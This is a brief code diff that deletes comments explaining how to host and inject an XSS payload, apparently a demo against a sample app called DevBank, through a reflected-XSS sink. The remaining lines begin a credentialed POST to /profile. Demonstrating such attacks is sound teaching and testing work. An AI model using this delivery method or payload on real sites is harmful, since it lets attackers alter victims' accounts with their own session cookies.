@@ -1,6 +1,3 @@
-// Upload this exact file to your own public GitHub repository, then load it via
-// jsDelivr as described in DEMO-CHECKLIST.md. It runs in DevBank's origin when
-// injected through the original reflected-XSS sink.
 fetch("/profile", {
   method: "POST",
   credentials: "include",
